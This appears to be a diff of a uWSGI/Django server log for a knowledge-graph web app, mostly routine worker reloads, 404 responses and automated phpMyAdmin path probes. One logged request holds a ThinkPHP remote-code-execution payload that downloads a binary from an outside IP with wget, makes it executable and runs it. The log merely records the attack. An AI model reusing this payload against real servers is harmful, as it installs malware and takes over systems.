+[pid: 6990|app: 0|req: 541/2519] 192.186.16.145 () {34 vars in 523 bytes} [Thu Mar 21 01:55:29 2019] GET /phpMyAdmin__/index.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6983|app: 0|req: 525/2520] 192.186.16.145 () {34 vars in 531 bytes} [Thu Mar 21 01:55:30 2019] GET /phpMyAdmin+++---/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 535/2521] 192.186.16.145 () {34 vars in 501 bytes} [Thu Mar 21 01:55:30 2019] GET /v/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6989|app: 0|req: 921/2522] 192.186.16.145 () {34 vars in 519 bytes} [Thu Mar 21 01:55:30 2019] GET /phpmyadm1n/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6983|app: 0|req: 526/2523] 192.186.16.145 () {34 vars in 519 bytes} [Thu Mar 21 01:55:30 2019] GET /phpMyAdm1n/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6990|app: 0|req: 542/2524] 192.186.16.145 () {34 vars in 515 bytes} [Thu Mar 21 01:55:30 2019] GET /shaAdmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6989|app: 0|req: 922/2525] 192.186.16.145 () {34 vars in 517 bytes} [Thu Mar 21 01:55:31 2019] GET /phpMyadmi/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6984|app: 0|req: 536/2526] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:31 2019] GET /phpMyAdmion/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 537/2527] 192.186.16.145 () {34 vars in 501 bytes} [Thu Mar 21 01:55:31 2019] GET /s/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 538/2528] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:33 2019] GET /phpMyAdmin1/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 539/2529] 192.186.16.145 () {34 vars in 525 bytes} [Thu Mar 21 01:55:33 2019] GET /phpMyAdmin123/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6990|app: 0|req: 543/2530] 192.186.16.145 () {34 vars in 505 bytes} [Thu Mar 21 01:55:33 2019] GET /pwd/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6984|app: 0|req: 540/2531] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:33 2019] GET /phpMyAdmina/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6989|app: 0|req: 923/2532] 192.186.16.145 () {34 vars in 517 bytes} [Thu Mar 21 01:55:33 2019] GET /phpMydmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6990|app: 0|req: 544/2533] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:33 2019] GET /phpMyAdmins/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6983|app: 0|req: 527/2534] 192.186.16.145 () {34 vars in 523 bytes} [Thu Mar 21 01:55:34 2019] GET /phpMyAdmin._/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 541/2535] 192.186.16.145 () {34 vars in 527 bytes} [Thu Mar 21 01:55:34 2019] GET /phpmyadmin2222/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6983|app: 0|req: 528/2536] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:34 2019] GET /php2MyAdmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 542/2537] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:34 2019] GET /phpiMyAdmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6989|app: 0|req: 924/2538] 192.186.16.145 () {34 vars in 519 bytes} [Thu Mar 21 01:55:34 2019] GET /phpNyAdmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6990|app: 0|req: 545/2539] 192.186.16.145 () {34 vars in 513 bytes} [Thu Mar 21 01:55:34 2019] GET /program/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6983|app: 0|req: 529/2540] 192.186.16.145 () {34 vars in 511 bytes} [Thu Mar 21 01:55:35 2019] GET /shopdb/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 543/2541] 192.186.16.145 () {34 vars in 511 bytes} [Thu Mar 21 01:55:35 2019] GET /phppma/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 544/2542] 192.186.16.145 () {34 vars in 521 bytes} [Thu Mar 21 01:55:37 2019] GET /mysql/admin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6990|app: 0|req: 546/2543] 192.186.16.145 () {34 vars in 525 bytes} [Thu Mar 21 01:55:37 2019] GET /mysql/dbadmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6984|app: 0|req: 545/2544] 192.186.16.145 () {34 vars in 531 bytes} [Thu Mar 21 01:55:37 2019] GET /mysql/sqlmanager/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6984|app: 0|req: 546/2545] 192.186.16.145 () {34 vars in 535 bytes} [Thu Mar 21 01:55:37 2019] GET /mysql/mysqlmanager/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6989|app: 0|req: 925/2546] 192.186.16.145 () {34 vars in 597 bytes} [Thu Mar 21 01:55:37 2019] GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6990|app: 0|req: 547/2547] 192.186.16.145 () {34 vars in 476 bytes} [Thu Mar 21 01:55:37 2019] GET /manager/html => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6984|app: 0|req: 547/2548] 120.199.34.100 () {42 vars in 824 bytes} [Thu Mar 21 02:27:42 2019] GET / => generated 11772 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 1)
+370====4
+{'title': '吃土豆好处多 六种食物千万不能一起吃', 'abstract': '吃土豆对身体好处非常的多，但是选择什么食物和土豆一起同食要慎重！你了解土豆不能和什么食物一起同食呢？吃土豆有什么好处呢？一起关注下吧！', 'url': 'https://ys.99.com.cn/zhinan/696767.htm'}
+[pid: 6989|app: 0|req: 926/2549] 120.199.34.100 () {44 vars in 846 bytes} [Thu Mar 21 02:27:42 2019] GET /views/console/ => generated 13426 bytes in 532 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+Thu Mar 21 02:27:43 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
 ...gracefully killing workers...
-Gracefully killing worker 1 (pid: 736)...
-Gracefully killing worker 2 (pid: 737)...
-Gracefully killing worker 3 (pid: 738)...
-Gracefully killing worker 4 (pid: 739)...
-[uwsgi-python-reloader] module/file ./Django/interlocution_view.py has been modified
-[uwsgi-python-reloader] module/file ./Django/interlocution_view.py has been modified
-[uwsgi-python-reloader] module/file ./Django/interlocution_view.py has been modified
-worker 2 buried after 2 seconds
-worker 1 buried after 3 seconds
-worker 3 buried after 3 seconds
-worker 4 buried after 3 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 05:36:13 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xb0d1f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 5 seconds on interpreter 0xb0d1f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 21599, cores: 2)
-spawned uWSGI worker 2 (pid: 21600, cores: 2)
-spawned uWSGI worker 3 (pid: 21601, cores: 2)
-spawned uWSGI worker 4 (pid: 21602, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-Not Found: /otsmobile/app/mds/mgw.htm
-[pid: 21602|app: 0|req: 1/1] 113.237.183.146 () {46 vars in 726 bytes} [Sun Mar 17 05:36:40 2019] GET /otsmobile/app/mds/mgw.htm => generated 6869 bytes in 2628 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./Django/interlocution_view.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 21599)...
-Gracefully killing worker 2 (pid: 21600)...
-Gracefully killing worker 3 (pid: 21601)...
-Gracefully killing worker 4 (pid: 21602)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 05:37:13 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x1ab11f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1ab11f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 21717, cores: 2)
-spawned uWSGI worker 2 (pid: 21718, cores: 2)
-spawned uWSGI worker 3 (pid: 21719, cores: 2)
-spawned uWSGI worker 4 (pid: 21720, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-Not Found: /public/index.php
-[pid: 21720|app: 0|req: 1/1] 195.231.8.124 () {36 vars in 991 bytes} [Sun Mar 17 05:41:15 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://81.4.102.114/love/ai.x86%20;chmod%20777%20*%20ai.x86;%20cat%20ai.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 7100 bytes in 783 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
-Sun Mar 17 05:44:10 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 21717)...
-Gracefully killing worker 2 (pid: 21718)...
-Gracefully killing worker 3 (pid: 21719)...
-Gracefully killing worker 4 (pid: 21720)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 05:44:11 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x28211f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x28211f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 22449, cores: 2)
-spawned uWSGI worker 2 (pid: 22450, cores: 2)
-spawned uWSGI worker 3 (pid: 22451, cores: 2)
-spawned uWSGI worker 4 (pid: 22452, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 05:46:38 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 22449)...
-Gracefully killing worker 2 (pid: 22450)...
-Gracefully killing worker 3 (pid: 22451)...
-Gracefully killing worker 4 (pid: 22452)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 05:46:39 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x22e11f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x22e11f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 22706, cores: 2)
-spawned uWSGI worker 2 (pid: 22707, cores: 2)
-spawned uWSGI worker 3 (pid: 22708, cores: 2)
-spawned uWSGI worker 4 (pid: 22709, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 05:57:45 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 22706)...
-Gracefully killing worker 2 (pid: 22707)...
-Gracefully killing worker 3 (pid: 22708)...
-Gracefully killing worker 4 (pid: 22709)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 05:57:46 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x28741f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x28741f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 23803, cores: 2)
-spawned uWSGI worker 2 (pid: 23804, cores: 2)
-spawned uWSGI worker 3 (pid: 23805, cores: 2)
-spawned uWSGI worker 4 (pid: 23806, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 05:58:09 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 23803)...
-Gracefully killing worker 2 (pid: 23804)...
-Gracefully killing worker 3 (pid: 23805)...
-Gracefully killing worker 4 (pid: 23806)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 05:58:10 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x11c61f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x11c61f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 23867, cores: 2)
-spawned uWSGI worker 2 (pid: 23868, cores: 2)
-spawned uWSGI worker 3 (pid: 23869, cores: 2)
-spawned uWSGI worker 4 (pid: 23870, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 06:00:05 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 23867)...
-Gracefully killing worker 2 (pid: 23868)...
-Gracefully killing worker 3 (pid: 23869)...
-Gracefully killing worker 4 (pid: 23870)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:00:07 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xc351f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xc351f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 24106, cores: 2)
-spawned uWSGI worker 2 (pid: 24107, cores: 2)
-spawned uWSGI worker 3 (pid: 24108, cores: 2)
-spawned uWSGI worker 4 (pid: 24109, cores: 2)
-Python auto-reloader enabled
-Sun Mar 17 06:16:14 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 24106)...
-Gracefully killing worker 2 (pid: 24107)...
-Gracefully killing worker 3 (pid: 24108)...
-Gracefully killing worker 4 (pid: 24109)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:16:15 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
